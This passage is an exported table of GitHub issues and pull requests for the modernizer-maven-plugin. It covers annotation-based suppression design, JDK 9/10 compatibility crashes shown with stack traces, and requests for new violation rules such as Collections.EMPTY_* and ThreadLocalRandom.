   For example: `org/gaul/package/ClassOne\$ClassTwo(\$.+)?`
   2. If the annotation is on a method, the processor constructs a string with 4 parts, delimited by spaces - the fully
   qualified class name, the method name, the return type, and the list of parameters. These are normalized to be compared to the format
   expected by ASM.
   For example: `org/gaul/package/ClassOne methodOne int[] java.util.List`
3. The results of step 2 are dumped into 2 different files - `ignore-annotated-classes.txt` and
   `ignore-annotated-methods.txt`. These files are created in the `/target/modernizer/test` and `/target/modernizer/main`
   directories of the processing environment. Adding the files to these directories makes them accessible to the plugin while excluding them
   from the jar of the project being built.
4. The plugin reads the files created in the previous steps and uses them to ignore violations in the places specified.

## Testing strategy

`ModernizerSuppressionsEndToEndTestClass` has helper classes/methods annotated with `@SuppressWarnings(""modernizer"")`.
The processor scans this class before compiling and creates the ignore files.
End-to-end flow tests are added in `ModernizerSuppressionsEndToEndTest` which read the ignore files and check if
violations in the code are as expected.

We have benchmarked the plugin after this implementation, and haven't seen any performance issues.

## Further improvements

 - The format of `ignore-methods` file could be improved by making it more structured by using XML, JSON, or YAML.
 - `@SuppressWarnings(""modernizer"")` blocks all modernizer errors in that code block. Suppressing specific checks/errors can
   be done by adding something like `<id>ViolationIdentifier</id>` to the violations file structure, which uniquely
   identifies each violation. We can then use `@SuppressWarnings(""modernizer:ViolationIdentifier"")` to suppress errors
   related to those particular checks in the code block.",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/74/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/74/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/74/events,https://github.com/gaul/modernizer-maven-plugin/pull/74,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/74
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/73,309501361,MDU6SXNzdWUzMDk1MDEzNjE=,73,Not java10 compat,18299,closed,FALSE,NA,NA,8,2018-03-28T19:33:57Z,2018-10-27T23:07:32Z,2018-10-27T23:07:32Z,NONE,NA,"When running on a JDK 10 I get:
```
 Failed to execute goal org.gaul:modernizer-maven-plugin:1.6.0:modernizer (modernizer) on project jfr-srv-schemas: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.6.0:modernizer failed. IllegalArgumentException -> [Help 1]
21:29:38 org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.gaul:modernizer-maven-plugin:1.6.0:modernizer (modernizer) on project jfr-srv-schemas: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.6.0:modernizer failed.
21:29:38     at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:213)
21:29:38     at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:154)
21:29:38     at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:146)
21:29:38     at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)
21:29:38     at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:200)
21:29:38     at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:196)
21:29:38     at java.util.concurrent.FutureTask.run (FutureTask.java:264)
21:29:38     at java.util.concurrent.Executors$RunnableAdapter.call (Executors.java:514)
21:29:38     at java.util.concurrent.FutureTask.run (FutureTask.java:264)
21:29:38     at java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1135)
21:29:38     at java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:635)
21:29:38     at java.lang.Thread.run (Thread.java:844)
21:29:38 Caused by: org.apache.maven.plugin.PluginExecutionException: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.6.0:modernizer failed.
21:29:38     at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:145)
21:29:38     at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:208)
21:29:38     at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:154)
21:29:38     at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:146)
21:29:38     at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)
21:29:38     at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:200)
21:29:38     at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:196)
21:29:38     at java.util.concurrent.FutureTask.run (FutureTask.java:264)
21:29:38     at java.util.concurrent.Executors$RunnableAdapter.call (Executors.java:514)
21:29:38     at java.util.concurrent.FutureTask.run (FutureTask.java:264)
21:29:38     at java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1135)
21:29:38     at java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:635)
21:29:38     at java.lang.Thread.run (Thread.java:844)
21:29:38 Caused by: java.lang.IllegalArgumentException
21:29:38     at org.objectweb.asm.ClassReader.<init> (ClassReader.java:160)
21:29:38     at org.objectweb.asm.ClassReader.<init> (ClassReader.java:143)
21:29:38     at org.objectweb.asm.ClassReader.<init> (ClassReader.java:418)
21:29:38     at org.gaul.modernizer_maven_plugin.Modernizer.check (Modernizer.java:80)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:290)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles (ModernizerMojo.java:283)
21:29:38     at org.gaul.modernizer_maven_plugin.ModernizerMojo.execute (ModernizerMojo.java:199)
21:29:38     at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:134)
21:29:38     at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:208)
21:29:38     at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:154)
21:29:38     at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:146)
21:29:38     at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)
21:29:38     at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:200)
21:29:38     at org.apache.maven.lifecycle.internal.builder.multithreaded.MultiThreadedBuilder$1.call (MultiThreadedBuilder.java:196)
21:29:38     at java.util.concurrent.FutureTask.run (FutureTask.java:264)
21:29:38     at java.util.concurrent.Executors$RunnableAdapter.call (Executors.java:514)
21:29:38     at java.util.concurrent.FutureTask.run (FutureTask.java:264)
21:29:38     at java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1135)
21:29:38     at java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:635)
21:29:38     at java.lang.Thread.run (Thread.java:844)
21:29:38 [ERROR] 
21:29:38 [ERROR] Re-run Maven using the -X switch to enable full debug logging.
21:29:38 [ERROR] 
```",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/73/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/73/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/73/events,https://github.com/gaul/modernizer-maven-plugin/issues/73,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/72,302121630,MDU6SXNzdWUzMDIxMjE2MzA=,72,Programmatically generate modernizer.xml,848247,open,FALSE,NA,NA,0,2018-03-04T21:00:42Z,2018-03-04T21:00:42Z,NA,OWNER,NA,Less error prone then running `javap` over the test source.  This also might allow checking the violation against the recommendation.,NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/72/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/72/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/72/events,https://github.com/gaul/modernizer-maven-plugin/issues/72,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/71,302116967,MDExOlB1bGxSZXF1ZXN0MTcyNzM4MDA3,71,Add Java 10 violations,848247,closed,FALSE,NA,NA,1,2018-03-04T20:08:11Z,2018-03-09T05:01:58Z,2018-03-09T05:01:07Z,OWNER,NA,Fixes #70.,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/71/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/71/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/71/events,https://github.com/gaul/modernizer-maven-plugin/pull/71,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/71
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/70,299916321,MDU6SXNzdWUyOTk5MTYzMjE=,70,JDK 10 immutable collection copy violations,848247,closed,FALSE,NA,NA,4,2018-02-24T06:15:47Z,2020-05-09T07:45:04Z,2018-03-09T05:01:07Z,OWNER,NA,"JDK 10 will add `List.copyOf` and `Map.copyOf` which should replace Guava `ImmutableList.copyOf` and `ImmutableMap.copyOf`:

https://bugs.openjdk.java.net/browse/JDK-8177290

@vorburger Could you investigate this?",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/70/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/70/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/70/events,https://github.com/gaul/modernizer-maven-plugin/issues/70,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/69,297517661,MDU6SXNzdWUyOTc1MTc2NjE=,69,Release of 1.7.0 to Maven central,298598,closed,FALSE,NA,NA,7,2018-02-15T16:49:17Z,2018-11-12T15:07:38Z,2018-11-10T02:01:28Z,CONTRIBUTOR,NA,"just a placeholder issue that I can get notified whenever @gaul you'll have a chance to release 1.7.0 ...

see also https://github.com/gaul/modernizer-maven-plugin/pull/67

Thank you!",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/69/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/69/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/69/events,https://github.com/gaul/modernizer-maven-plugin/issues/69,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/68,293738877,MDU6SXNzdWUyOTM3Mzg4Nzc=,68,Possible minor optimization in case of package and class name ignores,298598,open,FALSE,NA,NA,4,2018-02-02T01:03:56Z,2019-09-01T21:20:56Z,NA,CONTRIBUTOR,NA,"while I was working on https://github.com/gaul/modernizer-maven-plugin/pull/67 for  https://github.com/gaul/modernizer-maven-plugin/issues/64 I realized hat you could probably do a minor optimization... in case of package ignores (and the same goes for and class name ignores from my contribution; I've stuck to your style instead of mixing this idea into that change), then you should be able to return much earlier than the code currently does?

As is, the ignore is handled in the `private checkToken()` but that is per statement, right? So your checking entire packages or classes knowning that no violation in tem will ultimately ever be added to occurrences...

Move ignorePackages.contains(packageName) from checkToken to `ignoreClass()` (from my change), and the `visit()` method could return early `if (ignoreClass())` ?  Not sure what `MethodVisitor` it would have to turn, but I'm guessing there's a NOOP one.",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/68/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/68/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/68/events,https://github.com/gaul/modernizer-maven-plugin/issues/68,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/67,293734906,MDExOlB1bGxSZXF1ZXN0MTY2NjkxMDA4,67,new option to ignore by class FQN regexp,298598,closed,FALSE,NA,NA,7,2018-02-02T00:41:35Z,2018-02-14T16:16:35Z,2018-02-13T19:35:18Z,CONTRIBUTOR,NA,"for https://github.com/gaul/modernizer-maven-plugin/issues/64

Signed-off-by: Michael Vorburger <mike@vorburger.ch>
Signed-off-by: Michael Vorburger <vorburger@redhat.com>",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/67/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/67/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/67/events,https://github.com/gaul/modernizer-maven-plugin/pull/67,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/67
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/66,293724440,MDExOlB1bGxSZXF1ZXN0MTY2NjgzMTY1,66,add Eclipse files to .gitignore,298598,closed,FALSE,NA,NA,0,2018-02-01T23:44:45Z,2018-02-01T23:53:00Z,2018-02-01T23:53:00Z,CONTRIBUTOR,NA,NA,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/66/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/66/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/66/events,https://github.com/gaul/modernizer-maven-plugin/pull/66,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/66
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/65,293721805,MDExOlB1bGxSZXF1ZXN0MTY2NjgxMTY4,65,clarify exclusionPatterns in README,298598,closed,FALSE,NA,NA,1,2018-02-01T23:31:39Z,2018-02-01T23:45:55Z,2018-02-01T23:45:55Z,CONTRIBUTOR,NA,see also https://github.com/gaul/modernizer-maven-plugin/issues/64,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/65/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/65/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/65/events,https://github.com/gaul/modernizer-maven-plugin/pull/65,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/65
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/64,293721538,MDU6SXNzdWUyOTM3MjE1Mzg=,64,Option to ignore/exclude by class name,298598,closed,FALSE,NA,NA,2,2018-02-01T23:30:27Z,2018-02-15T16:55:32Z,2018-02-15T16:55:32Z,CONTRIBUTOR,NA,"It would be useful to be able to ignore/exclude by class name reg exp, e.g. for some cases of https://github.com/gaul/modernizer-maven-plugin/issues/28.

This is not possible today; the `exclusionPatterns` actually do not match on class name, but on _tokens_ (I just debug it...), and the `ignorePackages` only on package names.

I'll see if I can come up with a PR for an `ignoreClassPatterns` kind of thing.",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/64/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/64/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/64/events,https://github.com/gaul/modernizer-maven-plugin/issues/64,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/63,293693279,MDExOlB1bGxSZXF1ZXN0MTY2NjU5Mjgz,63,bump version in README example from 1.5.0 to 1.6.0,298598,closed,FALSE,NA,NA,1,2018-02-01T21:40:40Z,2018-02-01T21:41:56Z,2018-02-01T21:41:42Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/63/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/63/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/63/events,https://github.com/gaul/modernizer-maven-plugin/pull/63,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/63
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/62,274298142,MDExOlB1bGxSZXF1ZXN0MTUyODgwMzU5,62,#61 Prefer ThreadLocalRandom over Random,5672548,closed,FALSE,NA,NA,1,2017-11-15T20:44:23Z,2018-10-30T04:52:47Z,2018-10-30T04:52:47Z,NONE,NA,Adding violation for `new Random()` and `new Random(long)` to prefer the more modern `ThreadLocalRandom.current()`,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/62/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/62/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/62/events,https://github.com/gaul/modernizer-maven-plugin/pull/62,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/62
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/61,274297881,MDU6SXNzdWUyNzQyOTc4ODE=,61,Prefer ThreadLocalRandom over Random in JDK>=1.7,5672548,open,FALSE,NA,NA,5,2017-11-15T20:43:27Z,2017-11-20T23:15:05Z,NA,NONE,NA,"Prefer ThreadLocalRandom over Random to reduce contention and overhead

https://docs.oracle.com/javase/7/docs/api/java/util/concurrent/ThreadLocalRandom.html",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/61/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/61/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/61/events,https://github.com/gaul/modernizer-maven-plugin/issues/61,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/60,256772788,MDU6SXNzdWUyNTY3NzI3ODg=,60,Java 9 compatibility,848247,closed,FALSE,NA,NA,1,2017-09-11T16:55:01Z,2017-10-28T17:13:07Z,2017-10-28T17:11:06Z,OWNER,NA,"modernizer fails with Java 9:

```
[ERROR] Failed to execute goal org.gaul:modernizer-maven-plugin:1.5.0:modernizer (modernizer) on project jclouds-core: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.5.0:modernizer failed.: IllegalArgumentException -> [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.gaul:modernizer-maven-plugin:1.5.0:modernizer (modernizer) on project jclouds-core: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.5.0:modernizer failed.
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:213)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:154)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:146)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:117)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:81)
        at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build(SingleThreadedBuilder.java:51)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:128)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:309)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:194)
        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:107)
        at org.apache.maven.cli.MavenCli.execute(MavenCli.java:993)
        at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:345)
        at org.apache.maven.cli.MavenCli.main(MavenCli.java:191)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.base/java.lang.reflect.Method.invoke(Method.java:564)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:289)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:229)
        at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:415)
        at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:356)
Caused by: org.apache.maven.plugin.PluginExecutionException: Execution modernizer of goal org.gaul:modernizer-maven-plugin:1.5.0:modernizer failed.
        at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:145)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:208)
        ... 20 more
Caused by: java.lang.IllegalArgumentException
        at org.objectweb.asm.ClassReader.<init>(Unknown Source)
        at org.objectweb.asm.ClassReader.<init>(Unknown Source)
        at org.objectweb.asm.ClassReader.<init>(Unknown Source)
        at org.gaul.modernizer_maven_plugin.Modernizer.check(Modernizer.java:80)
        at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles(ModernizerMojo.java:290)
        at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles(ModernizerMojo.java:283)
        at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles(ModernizerMojo.java:283)
        at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles(ModernizerMojo.java:283)
        at org.gaul.modernizer_maven_plugin.ModernizerMojo.recurseFiles(ModernizerMojo.java:283)
        at org.gaul.modernizer_maven_plugin.ModernizerMojo.execute(ModernizerMojo.java:199)
        at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:134)
        ... 21 more
```

Upgrading the asm dependencies to 6.0_BETA addresses this issue.",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/60/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/60/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/60/events,https://github.com/gaul/modernizer-maven-plugin/issues/60,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/59,242070193,MDExOlB1bGxSZXF1ZXN0MTI5OTIzODg0,59,com.google.common.primitives.UnsignedLongs replacements are in java.lang.Long,675169,closed,FALSE,NA,NA,1,2017-07-11T14:34:17Z,2017-07-11T16:25:09Z,2017-07-11T16:24:57Z,CONTRIBUTOR,NA,the current release suggest to use java.lang.UnsignedLongs that does not exists,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/59/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/59/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/59/events,https://github.com/gaul/modernizer-maven-plugin/pull/59,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/59
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/58,215028131,MDExOlB1bGxSZXF1ZXN0MTExMjk4NTUx,58,#57 Violation for EMPTY Collections constants,2237314,closed,FALSE,NA,NA,1,2017-03-17T14:58:09Z,2017-03-17T17:47:02Z,2017-03-17T17:46:49Z,CONTRIBUTOR,NA,"Adding violations for `Collections.EMPTY_LIST`, `EMPTY_MAP`, and `EMPTY_SET` to prefer the more modern `emptyList()`, etc. methods which are actually type safe.",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/58/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/58/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/58/events,https://github.com/gaul/modernizer-maven-plugin/pull/58,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/58
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/57,214489395,MDU6SXNzdWUyMTQ0ODkzOTU=,57,Rule to check Collections.EMPTY_MAP/LIST/SET as they are not type-safe,2237314,closed,FALSE,NA,NA,2,2017-03-15T18:46:58Z,2017-03-17T17:47:08Z,2017-03-17T17:47:08Z,CONTRIBUTOR,NA,"We should add a rule to prefer using `java.util.Collections.emptyMap()` over `java.util.Collections.EMPTY_MAP`. The same should be applied for `EMPTY_SET` and `EMPTY_LIST`. This will promote avoidance of common unchecked operation warnings.

Ref:
https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#EMPTY_LIST
https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#emptyList--",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/57/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/57/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/57/events,https://github.com/gaul/modernizer-maven-plugin/issues/57,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/56,202686728,MDExOlB1bGxSZXF1ZXN0MTAyODI2ODQ2,56,"Allow multiple violation files, including classpath references. Fixes #22 and #42.",460141,closed,FALSE,NA,NA,3,2017-01-23T23:58:03Z,2017-01-24T22:38:34Z,2017-01-24T22:38:34Z,CONTRIBUTOR,NA,"We need this in https://github.com/prestodb/presto/pull/7204. Otherwise we'd have to copy the original violations xml into our project, which we'd like to avoid :)",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/56/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/56/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/56/events,https://github.com/gaul/modernizer-maven-plugin/pull/56,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/56
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/55,201428862,MDExOlB1bGxSZXF1ZXN0MTAxOTYzODM4,55,Support specifying exclusions using regex patterns,9230,closed,FALSE,NA,NA,1,2017-01-17T22:49:15Z,2017-01-17T23:02:41Z,2017-01-17T22:59:39Z,CONTRIBUTOR,NA,Fixes #51,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/55/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/55/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/55/events,https://github.com/gaul/modernizer-maven-plugin/pull/55,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/55
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/54,201409368,MDExOlB1bGxSZXF1ZXN0MTAxOTQ5NTky,54,Allow configuration of violation log level,848247,closed,FALSE,NA,NA,1,2017-01-17T21:24:47Z,2017-01-23T23:16:08Z,2017-01-23T23:16:08Z,OWNER,NA,Fixes #49.,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/54/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/54/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/54/events,https://github.com/gaul/modernizer-maven-plugin/pull/54,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/54
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/53,194832057,MDExOlB1bGxSZXF1ZXN0OTc0NTg5MjU=,53,Add link to gradle plugin.,375693,closed,FALSE,NA,NA,1,2016-12-11T13:31:46Z,2016-12-13T02:24:03Z,2016-12-13T02:23:48Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/53/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/53/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/53/events,https://github.com/gaul/modernizer-maven-plugin/pull/53,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/53
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/52,192535600,MDU6SXNzdWUxOTI1MzU2MDA=,52,Plugin to Jenkins?,818372,closed,FALSE,NA,NA,1,2016-11-30T10:58:17Z,2017-01-17T21:09:47Z,2017-01-17T21:09:47Z,NONE,NA,"Hi,

I am finding a Jenkins plugin to view modernizer results.

